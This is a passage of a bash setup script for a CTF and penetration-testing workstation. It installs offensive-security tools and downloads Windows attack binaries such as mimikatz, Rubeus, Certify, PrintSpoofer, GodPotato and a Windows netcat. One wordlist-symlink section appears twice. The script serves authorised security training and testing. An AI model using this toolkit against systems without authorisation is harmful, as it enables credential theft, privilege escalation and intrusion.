    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ background-color "#0a0e14"
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ foreground-color "#9fef00"
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ bold-color "#9fef00"
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ use-system-font false
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ font "Monospace 11"

    # Color palette (HTB-style)
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ palette "#0a0e14:#ff3333:#9fef00:#ffaf00:#0a84ff:#ff6ac1:#5ccfe6:#ffffff:#555555:#ff6666:#9fef00:#ffcc00:#0a84ff:#ff6ac1:#5ccfe6:#ffffff"

    echo "✓ HTB Pwnbox profile created for MATE Terminal"
    echo "  Open terminal preferences and select 'HTB Pwnbox' profile"

elif [[ "$TERMINAL" == "gnome" ]]; then
    # GNOME Terminal configuration
    PROFILE_ID=$(uuidgen)

    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/visible-name "'HTB Pwnbox'"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/use-theme-colors "false"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/background-color "'#0a0e14'"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/foreground-color "'#9fef00'"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/bold-color "'#9fef00'"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/use-system-font "false"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/font "'Monospace 11'"
    dconf write /org/gnome/terminal/legacy/profiles:/:$PROFILE_ID/palette "['#0a0e14', '#ff3333', '#9fef00', '#ffaf00', '#0a84ff', '#ff6ac1', '#5ccfe6', '#ffffff', '#555555', '#ff6666', '#9fef00', '#ffcc00', '#0a84ff', '#ff6ac1', '#5ccfe6', '#ffffff']"

    # Add to profile list
    PROFILE_LIST=$(dconf read /org/gnome/terminal/legacy/profiles:/list)
    NEW_LIST=$(echo "$PROFILE_LIST" | sed "s/]$/, '$PROFILE_ID']/")
    dconf write /org/gnome/terminal/legacy/profiles:/list "$NEW_LIST"

    echo "✓ HTB Pwnbox profile created for GNOME Terminal"
    echo "  Open terminal preferences and select 'HTB Pwnbox' profile"
fi
EOFTERMINAL

chmod +x "$USER_HOME/.config/htb-terminal-setup.sh"
chown "$USERNAME":"$USERNAME" "$USER_HOME/.config/htb-terminal-setup.sh"
log_success "HTB terminal profile script created at ~/.config/htb-terminal-setup.sh"
log_info "Run ~/.config/htb-terminal-setup.sh after first login to apply terminal colors"

# ============================================
# PHASE 7: PYTHON TOOLS
# ============================================
log_section "Phase 7: Installing Python Tools"

# Ensure pipx in PATH
export PATH="$USER_HOME/.local/bin:$PATH"

# System-wide Python tools
PYTHON_TOOLS=(
    "impacket"
    "bloodhound"
    "bloodyAD"
    "mitm6"
    # Binary exploitation
    "pwntools"
    "pycryptodome"
    # Network/packet crafting
    "scapy"
    # Web callbacks & scripting
    "flask"
    "paramiko"
    "PyJWT"
    "requests"
    "beautifulsoup4"
    "lxml"
    # OSCP/CTF utilities
    "pyOpenSSL"
    "python-dotenv"
    # Model Context Protocol SDK (build Claude MCP servers)
    "mcp"
)

log_info "Installing Python tools (system-wide)..."
for tool in "${PYTHON_TOOLS[@]}"; do
    if python3 -c "import $tool" 2>/dev/null; then
        log_skip "$tool already installed"
    else
        if pip3 install --break-system-packages "$tool" 2>&1 | tee -a "$LOG_FILE"; then
            log_info "Installed: $tool"
        else
            log_warn "Failed to install: $tool"
        fi
    fi
done

# NetExec - special case (git install)
log_info "Installing NetExec..."
if command_exists netexec || command_exists nxc; then
    log_skip "NetExec already installed"
else
    if pip3 install --break-system-packages git+https://github.com/Pennyw0rth/NetExec 2>&1 | tee -a "$LOG_FILE"; then
        log_success "NetExec installed"
    else
        log_warn "Failed to install NetExec (non-critical)"
    fi
fi

# pipx-based tools (isolated)
log_info "Installing pipx tools..."

# Ensure pipx is actually installed before trying to use it
if ! command_exists pipx; then
    log_warn "pipx not found, attempting to install..."
    apt-get install -y pipx 2>&1 | tee -a "$LOG_FILE" || \
    pip3 install --break-system-packages pipx 2>&1 | tee -a "$LOG_FILE" || \
    log_warn "pipx install failed — skipping pipx tools"
fi

if command_exists pipx; then
    su - "$USERNAME" -c "pipx ensurepath"

    PIPX_TOOLS=(
        "ldapdomaindump"
        "sprayhound"
        "certipy-ad"
        "ROPgadget"
        "ropper"
        "crackmapexec"
    )

    for tool in "${PIPX_TOOLS[@]}"; do
        if su - "$USERNAME" -c "pipx list" | grep -q "$tool"; then
            log_skip "$tool already installed via pipx"
        else
            if su - "$USERNAME" -c "pipx install $tool" 2>&1 | tee -a "$LOG_FILE"; then
                log_info "Installed via pipx: $tool"
            else
                log_warn "Failed to install via pipx: $tool"
            fi
        fi
    done
else
    log_warn "Skipping pipx tools — pipx unavailable"
fi

# Playwright — browser automation for XSS-bot and headless browser challenges
log_info "Installing Playwright..."
if python3 -c "import playwright" 2>/dev/null; then
    log_skip "Playwright already installed"
else
    if pip3 install --break-system-packages playwright 2>&1 | tee -a "$LOG_FILE"; then
        log_info "Installing Playwright Chromium browser and system deps..."
        # Try as user first (browsers install to ~/.cache), fall back to root
        if su - "$USERNAME" -c "playwright install chromium --with-deps" 2>&1 | tee -a "$LOG_FILE"; then
            log_success "Playwright + Chromium installed"
        else
            log_warn "playwright install chromium failed — run 'playwright install chromium --with-deps' after login"
        fi
    else
        log_warn "Failed to install Playwright (non-critical)"
    fi
fi

# ============================================
# PHASE 8: RUBY TOOLS
# ============================================
log_section "Phase 8: Installing Ruby Tools"

RUBY_TOOLS=(
    "evil-winrm"
    "one_gadget"
    "haiti-hash"
)

for tool in "${RUBY_TOOLS[@]}"; do
    if gem list -i "$tool" &>/dev/null; then
        log_skip "$tool already installed"
    else
        if gem install "$tool" 2>&1 | tee -a "$LOG_FILE"; then
            log_info "Installed: $tool"
        else
            log_warn "Failed to install: $tool"
        fi
    fi
done

# ============================================
# PHASE 9: GO TOOLS
# ============================================
log_section "Phase 9: Installing Go Security Tools"

# Array of Go tools with full package paths
declare -A GO_TOOLS=(
    ["httpx"]="github.com/projectdiscovery/httpx/cmd/httpx@latest"
    ["subfinder"]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    ["dnsx"]="github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    ["nuclei"]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    ["ffuf"]="github.com/ffuf/ffuf/v2@latest"
    ["gobuster"]="github.com/OJ/gobuster/v3@latest"
    ["kerbrute"]="github.com/ropnop/kerbrute@latest"
    ["chisel"]="github.com/jpillora/chisel@latest"
    ["ligolo-ng"]="github.com/nicocha30/ligolo-ng/cmd/proxy@latest"
    # OOB interaction detection (like Burp Collaborator, free)
    ["interactsh-client"]="github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    # Web crawler
    ["katana"]="github.com/projectdiscovery/katana/cmd/katana@latest"
    # Fast port scanner (PD suite)
    ["naabu"]="github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    # JS secret finder
    ["gf"]="github.com/tomnomnom/gf@latest"
    ["anew"]="github.com/tomnomnom/anew@latest"
)

log_info "Installing Go tools (this may take a while)..."
for tool_name in "${!GO_TOOLS[@]}"; do
    tool_path="${GO_TOOLS[$tool_name]}"
    if [[ -f "$USER_HOME/go/bin/$tool_name" ]]; then
        log_skip "$tool_name already installed"
    else
        log_info "Installing $tool_name..."
        if su - "$USERNAME" -c "export PATH=/usr/local/go/bin:\$HOME/go/bin:\$PATH && go install -v $tool_path" 2>&1 | tee -a "$LOG_FILE"; then
            log_success "$tool_name installed"
        else
            log_warn "Failed to install $tool_name"
        fi
    fi
done

# ============================================
# PHASE 10: REPOSITORIES, WORDLISTS & QUICK ACCESS
# ============================================
log_section "Phase 10: Repositories, Wordlists & Quick Access"

# Clone essential repositories
REPOS=(
    "https://github.com/danielmiessler/SecLists.git|SecLists"
    "https://github.com/brightio/penelope.git|penelope"
    "https://github.com/swisskyrepo/PayloadsAllTheThings.git|PayloadsAllTheThings"
    # Responder — aliased in shellshock_env, must exist at tools/repos/Responder
    "https://github.com/lgandx/Responder.git|Responder"
    # enum4linux-ng — aliased in shellshock_env, must exist at tools/repos/enum4linux-ng
    "https://github.com/cddmp/enum4linux-ng.git|enum4linux-ng"
    # pwndbg — GDB plugin for binary exploitation
    "https://github.com/pwndbg/pwndbg.git|pwndbg"
    # PEASS-ng for easy updates (linpeas/winpeas source)
    "https://github.com/carlospolop/PEASS-ng.git|PEASS-ng"
)

log_info "Cloning essential repositories..."
for repo_entry in "${REPOS[@]}"; do
    IFS='|' read -r url name <<< "$repo_entry"
    safe_clone "$url" "$USER_HOME/tools/repos/$name"
done

# Install SecLists via apt if available
log_info "Installing SecLists via apt..."
if apt-cache show seclists &>/dev/null; then
    if ! dpkg -l seclists 2>/dev/null | grep -q "^ii"; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq seclists 2>&1 | tee -a "$LOG_FILE" || log_warn "SecLists apt package not available"

        # Move from apt location to our tools location
        if [[ -d "/usr/share/seclists" ]] && [[ ! -d "$USER_HOME/tools/repos/SecLists" ]]; then
            log_info "Moving SecLists from /usr/share/seclists to tools/repos..."
            cp -r /usr/share/seclists "$USER_HOME/tools/repos/SecLists"
            chown -R "$USERNAME":"$USERNAME" "$USER_HOME/tools/repos/SecLists"
            log_success "SecLists moved to tools/repos"
        fi
    else
        log_skip "SecLists already installed via apt"
    fi
else
    log_info "SecLists apt package not available, using git clone"
fi

# Symlink SecLists to wordlists

# Create quick-access wordlist symlinks for common fuzzing tasks
log_info "Creating wordlist quick-access symlinks..."
SECLISTS_PATH="$USER_HOME/tools/repos/SecLists"

# Directory/file fuzzing
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/common.txt" "$USER_HOME/wordlists/common-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/big.txt" "$USER_HOME/wordlists/big-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/raft-medium-directories.txt" "$USER_HOME/wordlists/medium-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt" "$USER_HOME/wordlists/dirbuster-medium.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt" "$USER_HOME/wordlists/dirbuster-small.txt"

# Parameter fuzzing
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/burp-parameter-names.txt" "$USER_HOME/wordlists/params.txt"

# Subdomain enumeration
if [[ -f "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-5000.txt" "$USER_HOME/wordlists/subdomains-5k.txt"
fi
if [[ -f "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-20000.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-20000.txt" "$USER_HOME/wordlists/subdomains-20k.txt"
fi

# VHost fuzzing
if [[ -f "$SECLISTS_PATH/Discovery/DNS/namelist.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/namelist.txt" "$USER_HOME/wordlists/vhosts.txt"
fi

chown -h "$USERNAME":"$USERNAME" "$USER_HOME/wordlists"/*.txt 2>/dev/null || true
log_success "Wordlist quick-access symlinks created"

# Create quick-access wordlist symlinks for common fuzzing tasks
log_info "Creating wordlist quick-access symlinks..."
SECLISTS_PATH="$USER_HOME/tools/repos/SecLists"

# Directory/file fuzzing
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/common.txt" "$USER_HOME/wordlists/common-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/big.txt" "$USER_HOME/wordlists/big-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/raft-medium-directories.txt" "$USER_HOME/wordlists/medium-dirs.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt" "$USER_HOME/wordlists/dirbuster-medium.txt"
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt" "$USER_HOME/wordlists/dirbuster-small.txt"

# Parameter fuzzing
ln -sf "$SECLISTS_PATH/Discovery/Web-Content/burp-parameter-names.txt" "$USER_HOME/wordlists/params.txt"

# Subdomain enumeration
if [[ -f "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-5000.txt" "$USER_HOME/wordlists/subdomains-5k.txt"
fi
if [[ -f "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-20000.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-20000.txt" "$USER_HOME/wordlists/subdomains-20k.txt"
fi

# VHost fuzzing
if [[ -f "$SECLISTS_PATH/Discovery/DNS/namelist.txt" ]]; then
    ln -sf "$SECLISTS_PATH/Discovery/DNS/namelist.txt" "$USER_HOME/wordlists/vhosts.txt"
fi

chown -h "$USERNAME":"$USERNAME" "$USER_HOME/wordlists"/*.txt 2>/dev/null || true
log_success "Wordlist quick-access symlinks created"
if [[ ! -L "$USER_HOME/wordlists/SecLists" ]]; then
    ln -s "$USER_HOME/tools/repos/SecLists" "$USER_HOME/wordlists/SecLists"
    log_info "Symlinked SecLists to wordlists directory"
fi

# Extract rockyou.txt
if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]] && [[ ! -f "$USER_HOME/wordlists/rockyou.txt" ]]; then
    log_info "Extracting rockyou.txt..."
    gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$USER_HOME/wordlists/rockyou.txt"
    log_success "rockyou.txt extracted"
elif [[ -f "$USER_HOME/wordlists/rockyou.txt" ]]; then
    log_skip "rockyou.txt already present"
fi

# Download PEAS binaries directly
log_info "Downloading PEAS tools from GitHub releases..."
mkdir -p "$USER_HOME/tools/scripts"

# linPEAS.sh
if [[ ! -f "$USER_HOME/tools/scripts/linpeas.sh" ]]; then
    log_info "Downloading linpeas.sh..."
    if wget --timeout=30 --tries=3 -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O "$USER_HOME/tools/scripts/linpeas.sh" 2>&1 | tee -a "$LOG_FILE"; then
        chmod +x "$USER_HOME/tools/scripts/linpeas.sh"
        chown "$USERNAME":"$USERNAME" "$USER_HOME/tools/scripts/linpeas.sh"
        log_success "linpeas.sh downloaded"
    else
        log_warn "Failed to download linpeas.sh"
    fi
else
    log_skip "linpeas.sh already present"
fi

# winPEAS.exe
if [[ ! -f "$USER_HOME/tools/scripts/winpeas.exe" ]]; then
    log_info "Downloading winPEASx64.exe..."
    if wget --timeout=30 --tries=3 -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O "$USER_HOME/tools/scripts/winpeas.exe" 2>&1 | tee -a "$LOG_FILE"; then
        chown "$USERNAME":"$USERNAME" "$USER_HOME/tools/scripts/winpeas.exe"
        log_success "winpeas.exe downloaded"
    else
        log_warn "Failed to download winpeas.exe"
    fi
else
    log_skip "winpeas.exe already present"
fi

# pspy64 — process monitor without root (essential for Linux privesc)
if [[ ! -f "$USER_HOME/tools/scripts/pspy64" ]]; then
    log_info "Downloading pspy64..."
    if wget --timeout=30 --tries=3 -q https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O "$USER_HOME/tools/scripts/pspy64" 2>&1 | tee -a "$LOG_FILE"; then
        chmod +x "$USER_HOME/tools/scripts/pspy64"
        chown "$USERNAME":"$USERNAME" "$USER_HOME/tools/scripts/pspy64"
        log_success "pspy64 downloaded"
    else
        log_warn "Failed to download pspy64"
    fi
else
    log_skip "pspy64 already present"
fi

# stegseek — fast steghide bruteforcer (CTF staple)
if ! command_exists stegseek; then
    log_info "Downloading stegseek..."
    STEGSEEK_URL=$(curl -s https://api.github.com/repos/RickdeJager/stegseek/releases/latest 2>/dev/null | grep "browser_download_url.*stegseek.*amd64.deb" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$STEGSEEK_URL" ]]; then
        if wget --timeout=30 --tries=3 -q "$STEGSEEK_URL" -O /tmp/stegseek.deb 2>&1 | tee -a "$LOG_FILE"; then
            DEBIAN_FRONTEND=noninteractive dpkg -i /tmp/stegseek.deb 2>&1 | tee -a "$LOG_FILE" || \
                apt-get install -f -y 2>&1 | tee -a "$LOG_FILE" || true
            rm -f /tmp/stegseek.deb
            log_success "stegseek installed"
        else
            log_warn "Failed to download stegseek"
        fi
    else
        log_warn "Could not find stegseek release URL (non-critical)"
    fi
else
    log_skip "stegseek already installed"
fi

# rustscan — ultra-fast port scanner
if ! command_exists rustscan; then
    log_info "Downloading rustscan..."
    RUSTSCAN_URL=$(curl -s https://api.github.com/repos/RustScan/RustScan/releases/latest 2>/dev/null | grep "browser_download_url.*amd64.deb" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$RUSTSCAN_URL" ]]; then
        if wget --timeout=30 --tries=3 -q "$RUSTSCAN_URL" -O /tmp/rustscan.deb 2>&1 | tee -a "$LOG_FILE"; then
            DEBIAN_FRONTEND=noninteractive dpkg -i /tmp/rustscan.deb 2>&1 | tee -a "$LOG_FILE" || \
                apt-get install -f -y 2>&1 | tee -a "$LOG_FILE" || true
            rm -f /tmp/rustscan.deb
            log_success "rustscan installed"
        else
            log_warn "Failed to download rustscan"
        fi
    else
        log_warn "Could not find rustscan release URL (non-critical)"
    fi
else
    log_skip "rustscan already installed"
fi

# feroxbuster — recursive web content discovery
if ! command_exists feroxbuster; then
    log_info "Downloading feroxbuster..."
    FEROX_URL=$(curl -s https://api.github.com/repos/epi052/feroxbuster/releases/latest 2>/dev/null | grep "browser_download_url.*x86_64.*linux.*gz\"" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$FEROX_URL" ]]; then
        if wget --timeout=30 --tries=3 -q "$FEROX_URL" -O /tmp/feroxbuster.tar.gz 2>&1 | tee -a "$LOG_FILE"; then
            tar -xzf /tmp/feroxbuster.tar.gz -C /usr/local/bin feroxbuster 2>/dev/null || \
                tar -xzf /tmp/feroxbuster.tar.gz -C /tmp && mv /tmp/feroxbuster /usr/local/bin/ 2>/dev/null || true
            chmod +x /usr/local/bin/feroxbuster 2>/dev/null || true
            rm -f /tmp/feroxbuster.tar.gz
            log_success "feroxbuster installed"
        else
            log_warn "Failed to download feroxbuster"
        fi
    else
        log_warn "Could not find feroxbuster release URL (non-critical)"
    fi
else
    log_skip "feroxbuster already installed"
fi

# Penelope
if [[ -f "$USER_HOME/tools/repos/penelope/penelope.py" ]]; then
    ln -sf "$USER_HOME/tools/repos/penelope/penelope.py" "$USER_HOME/tools/scripts/penelope.py"
    chmod +x "$USER_HOME/tools/repos/penelope/penelope.py"
    log_success "penelope.py symlinked"
else
    log_warn "penelope.py not found"
fi

# ============================================
# PHASE 10.5: BINARY EXPLOITATION SETUP
# ============================================
log_section "Phase 10.5: Binary Exploitation Tools"

# pwndbg — GDB enhanced for pwn challenges
if [[ -d "$USER_HOME/tools/repos/pwndbg" ]]; then
    log_info "Running pwndbg setup..."
    cd "$USER_HOME/tools/repos/pwndbg"
    # setup.sh installs into the gdb that's in PATH
    if DEBIAN_FRONTEND=noninteractive bash setup.sh --quiet 2>&1 | tee -a "$LOG_FILE"; then
        log_success "pwndbg installed"
    else
        log_warn "pwndbg setup had issues — may need manual install"
    fi
    cd /
else
    log_warn "pwndbg repo not cloned — skipping (non-critical)"
fi

# enum4linux-ng — install Python dependencies so the alias works
if [[ -d "$USER_HOME/tools/repos/enum4linux-ng" ]]; then
    log_info "Installing enum4linux-ng Python deps..."
    pip3 install --break-system-packages \
        impacket ldap3 pycryptodome 2>&1 | tee -a "$LOG_FILE" || true
    chmod +x "$USER_HOME/tools/repos/enum4linux-ng/enum4linux-ng.py" 2>/dev/null || true
    log_success "enum4linux-ng ready"
fi

# gef — GDB Enhanced Features (alternative/supplement to pwndbg)
GEF_INIT="$USER_HOME/.gdbinit-gef.py"
if [[ ! -f "$GEF_INIT" ]]; then
    log_info "Downloading GEF (GDB Enhanced Features)..."
    if wget -q https://gef.blah.cat/py -O "$GEF_INIT" 2>&1 | tee -a "$LOG_FILE"; then
        chown "$USERNAME":"$USERNAME" "$GEF_INIT"
        # Only add to .gdbinit if pwndbg isn't already configured there
        if [[ ! -f "$USER_HOME/.gdbinit" ]] || ! grep -q "pwndbg\|gef" "$USER_HOME/.gdbinit" 2>/dev/null; then
            echo "source $GEF_INIT" >> "$USER_HOME/.gdbinit"
            chown "$USERNAME":"$USERNAME" "$USER_HOME/.gdbinit"
            log_success "GEF configured as default GDB plugin"
        else
            log_info "GEF downloaded to ~/.gdbinit-gef.py (pwndbg already configured in .gdbinit)"
        fi
    else
        log_warn "Failed to download GEF (non-critical)"
    fi
else
    log_skip "GEF already downloaded"
fi

# ============================================
# PHASE 11: WINDOWS BINARIES
# ============================================
log_section "Phase 11: Installing Windows Binaries"

mkdir -p "$USER_HOME/tools/windows"
cd "$USER_HOME/tools/windows"

# SharpHound
if [[ ! -f "SharpHound.exe" ]]; then
    log_info "Downloading SharpHound..."

    # Try GitHub API first
    SHARPHOUND_URL=$(curl -s https://api.github.com/repos/BloodHoundAD/SharpHound/releases/latest 2>/dev/null | grep "browser_download_url.*SharpHound.*zip" | head -n 1 | cut -d '"' -f 4 || true)

    if [[ -z "$SHARPHOUND_URL" ]]; then
        log_warn "GitHub API failed, trying direct download..."
        SHARPHOUND_URL="https://github.com/BloodHoundAD/SharpHound/releases/download/v2.5.8/SharpHound-v2.5.8.zip"
    fi

    log_info "URL: $SHARPHOUND_URL"

    if wget -q "$SHARPHOUND_URL" -O SharpHound.zip 2>&1 | tee -a "$LOG_FILE"; then
        if [[ -f "SharpHound.zip" ]] && [[ -s "SharpHound.zip" ]]; then
            unzip -q -o SharpHound.zip 2>/dev/null || log_warn "Unzip had issues"
            rm -f SharpHound.zip

            if [[ -f "SharpHound.exe" ]]; then
                log_success "SharpHound.exe downloaded"
            else
                log_warn "SharpHound.exe not found after extraction"
            fi
        else
            log_warn "SharpHound.zip download was empty or failed"
            rm -f SharpHound.zip
        fi
    else
        log_warn "Failed to download SharpHound (non-critical)"
    fi
else
    log_skip "SharpHound.exe already present"
fi

# Seatbelt
if [[ ! -f "Seatbelt.exe" ]]; then
    log_info "Downloading Seatbelt..."
    if wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe -O Seatbelt.exe 2>&1 | tee -a "$LOG_FILE"; then
        if [[ -f "Seatbelt.exe" ]] && [[ -s "Seatbelt.exe" ]]; then
            log_success "Seatbelt.exe downloaded"
        else
            log_warn "Seatbelt.exe download was empty"
            rm -f Seatbelt.exe
        fi
    else
        log_warn "Could not fetch Seatbelt.exe (non-critical)"
    fi
else
    log_skip "Seatbelt.exe already present"
fi

# Rubeus
if [[ ! -f "Rubeus.exe" ]]; then
    log_info "Downloading Rubeus..."
    if wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O Rubeus.exe 2>&1 | tee -a "$LOG_FILE"; then
        if [[ -f "Rubeus.exe" ]] && [[ -s "Rubeus.exe" ]]; then
            log_success "Rubeus.exe downloaded"
        else
            log_warn "Rubeus.exe download was empty"
            rm -f Rubeus.exe
        fi
    else
        log_warn "Could not fetch Rubeus.exe (non-critical)"
    fi
else
    log_skip "Rubeus.exe already present"
fi

# PowerView
if [[ ! -f "PowerView.ps1" ]]; then
    log_info "Downloading PowerView..."
    if wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O PowerView.ps1 2>&1 | tee -a "$LOG_FILE"; then
        if [[ -f "PowerView.ps1" ]] && [[ -s "PowerView.ps1" ]]; then
            log_success "PowerView.ps1 downloaded"
        else
            log_warn "PowerView.ps1 download was empty"
            rm -f PowerView.ps1
        fi
    else
        log_warn "Could not fetch PowerView.ps1 (non-critical)"
    fi
else
    log_skip "PowerView.ps1 already present"
fi

# nc.exe — Netcat for Windows (from nmap's bundled binaries)
if [[ ! -f "nc.exe" ]]; then
    log_info "Downloading nc.exe (Windows netcat)..."
    if wget -q https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe 2>&1 | tee -a "$LOG_FILE" && [[ -s "nc.exe" ]]; then
        log_success "nc.exe downloaded"
    else
        rm -f nc.exe
        log_warn "Could not fetch nc.exe (non-critical)"
    fi
else
    log_skip "nc.exe already present"
fi

# Chisel.exe — TCP/UDP tunnel for Windows targets
if [[ ! -f "chisel.exe" ]]; then
    log_info "Downloading Chisel.exe (Windows)..."
    CHISEL_WIN_URL=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest 2>/dev/null | grep "browser_download_url.*windows_amd64" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$CHISEL_WIN_URL" ]]; then
        if wget -q "$CHISEL_WIN_URL" -O /tmp/chisel_win.gz 2>&1 | tee -a "$LOG_FILE"; then
            gunzip -c /tmp/chisel_win.gz > chisel.exe 2>/dev/null || true
            rm -f /tmp/chisel_win.gz
            [[ -s "chisel.exe" ]] && log_success "chisel.exe downloaded" || { rm -f chisel.exe; log_warn "chisel.exe extraction failed"; }
        else
            log_warn "Failed to download chisel.exe"
        fi
    else
        log_warn "Could not find chisel Windows release URL"
    fi
else
    log_skip "chisel.exe already present"
fi

# Certify.exe — ADCS (Active Directory Certificate Services) exploitation
if [[ ! -f "Certify.exe" ]]; then
    log_info "Downloading Certify.exe..."
    if wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe -O Certify.exe 2>&1 | tee -a "$LOG_FILE" && [[ -s "Certify.exe" ]]; then
        log_success "Certify.exe downloaded"
    else
        rm -f Certify.exe
        log_warn "Could not fetch Certify.exe (non-critical)"
    fi
else
    log_skip "Certify.exe already present"
fi

# KrbRelayUp.exe — Kerberos relay for Windows privesc
if [[ ! -f "KrbRelayUp.exe" ]]; then
    log_info "Downloading KrbRelayUp.exe..."
    KRBRELAY_URL=$(curl -s https://api.github.com/repos/Dec0ne/KrbRelayUp/releases/latest 2>/dev/null | grep "browser_download_url.*KrbRelayUp.exe" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$KRBRELAY_URL" ]]; then
        if wget -q "$KRBRELAY_URL" -O KrbRelayUp.exe 2>&1 | tee -a "$LOG_FILE" && [[ -s "KrbRelayUp.exe" ]]; then
            log_success "KrbRelayUp.exe downloaded"
        else
            rm -f KrbRelayUp.exe
            log_warn "KrbRelayUp.exe download failed"
        fi
    else
        log_warn "Could not find KrbRelayUp release URL (non-critical)"
    fi
else
    log_skip "KrbRelayUp.exe already present"
fi

# PrintSpoofer64.exe — Windows printer spooler privesc
if [[ ! -f "PrintSpoofer64.exe" ]]; then
    log_info "Downloading PrintSpoofer64.exe..."
    if wget -q https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -O PrintSpoofer64.exe 2>&1 | tee -a "$LOG_FILE" && [[ -s "PrintSpoofer64.exe" ]]; then
        log_success "PrintSpoofer64.exe downloaded"
    else
        rm -f PrintSpoofer64.exe
        log_warn "Could not fetch PrintSpoofer64.exe (non-critical)"
    fi
else
    log_skip "PrintSpoofer64.exe already present"
fi

# GodPotato.exe — Windows token impersonation / potato attack
if [[ ! -f "GodPotato.exe" ]]; then
    log_info "Downloading GodPotato.exe..."
    GODPOTATO_URL=$(curl -s https://api.github.com/repos/BeichenDream/GodPotato/releases/latest 2>/dev/null | grep "browser_download_url.*NET4.exe" | head -n1 | cut -d'"' -f4 || true)
    if [[ -z "$GODPOTATO_URL" ]]; then
        GODPOTATO_URL=$(curl -s https://api.github.com/repos/BeichenDream/GodPotato/releases/latest 2>/dev/null | grep "browser_download_url.*exe" | head -n1 | cut -d'"' -f4 || true)
    fi
    if [[ -n "$GODPOTATO_URL" ]]; then
        if wget -q "$GODPOTATO_URL" -O GodPotato.exe 2>&1 | tee -a "$LOG_FILE" && [[ -s "GodPotato.exe" ]]; then
            log_success "GodPotato.exe downloaded"
        else
            rm -f GodPotato.exe
            log_warn "GodPotato.exe download failed"
        fi
    else
        log_warn "Could not find GodPotato release URL (non-critical)"
    fi
else
    log_skip "GodPotato.exe already present"
fi

# mimikatz — credential extraction (pre-compiled)
if [[ ! -f "mimikatz.exe" ]]; then
    log_info "Downloading mimikatz..."
    MIMI_URL=$(curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest 2>/dev/null | grep "browser_download_url.*mimikatz_trunk.zip" | head -n1 | cut -d'"' -f4 || true)
    if [[ -n "$MIMI_URL" ]]; then
        if wget -q "$MIMI_URL" -O /tmp/mimikatz.zip 2>&1 | tee -a "$LOG_FILE"; then
            unzip -q -j /tmp/mimikatz.zip "*/x64/mimikatz.exe" -d . 2>/dev/null || \
                unzip -q /tmp/mimikatz.zip "x64/mimikatz.exe" -d /tmp/mimi_extract && mv /tmp/mimi_extract/x64/mimikatz.exe . 2>/dev/null || true
            rm -f /tmp/mimikatz.zip
            [[ -s "mimikatz.exe" ]] && log_success "mimikatz.exe downloaded" || { log_warn "mimikatz.exe extraction failed"; rm -f mimikatz.exe; }
        else
            log_warn "Failed to download mimikatz"
        fi
    else
        log_warn "Could not find mimikatz release URL (non-critical)"
    fi
